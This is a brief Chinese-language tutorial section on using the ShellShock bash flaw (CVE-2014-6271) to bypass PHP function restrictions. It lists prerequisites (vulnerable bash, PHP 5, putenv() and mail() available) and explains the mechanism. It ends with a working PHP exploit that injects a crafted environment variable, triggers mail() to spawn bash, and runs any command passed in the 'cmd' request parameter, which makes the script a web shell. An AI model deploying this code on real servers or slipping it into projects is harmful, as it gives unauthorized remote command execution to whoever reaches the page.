## 利用 ShellShock 绕过

**1\. 前提条件**

* 目标OS存在Bash破壳（CVE-2014-6271）漏洞
* PHP 5.*
* linux
* putenv()、mail()可用

**2\. 基本原理**

一般函数体内的代码不会被执行，但破壳漏洞会错误的将"{}"花括号外的命令进行执行
php里的某些函数(例如:mail()、imap_mail())能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。

**3\. exp**

```php
<?php
   function shellshock($cmd) {
  $tmp = tempnam(".","data");
  putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
  mail("a@127.0.0.1","","","","-bv");
  $output = @file_get_contents($tmp);
  @unlink($tmp);
  if($output != "") return $output;
  else return "No output, or not vuln.";
}
echo shellshock($_REQUEST["cmd"]);
?>

```

